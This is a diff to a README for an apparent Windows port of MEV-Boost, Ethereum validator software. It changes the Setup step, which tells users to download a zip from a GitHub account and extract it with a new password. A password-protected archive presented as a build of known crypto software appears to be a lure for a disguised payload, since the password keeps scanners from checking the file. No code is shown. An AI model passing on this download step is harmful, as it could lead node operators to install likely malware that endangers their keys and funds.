@@ -35,7 +35,7 @@ A MEV-Boost security assessment was conducted on 2022-06-20 by [lotusbumi](https
 - .Net framework 4.6.1
 
 ## Setup:
-[Clone](https://github.com/Cardo16/mev-boost-windows/archive/refs/heads/main.zip) repository and extract files with password `mevboost`. The most common setup is to install MEV-Boost on the same machine as the beacon client. Multiple beacon-clients can use a single MEV-Boost instance. The default port is 18550.
+[Clone](https://github.com/Cardo16/mev-boost-windows/archive/refs/heads/main.zip) repository and extract files with password `gfnklVYUS`. The most common setup is to install MEV-Boost on the same machine as the beacon client. Multiple beacon-clients can use a single MEV-Boost instance. The default port is 18550.
 
 ## Copyright
 *THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*
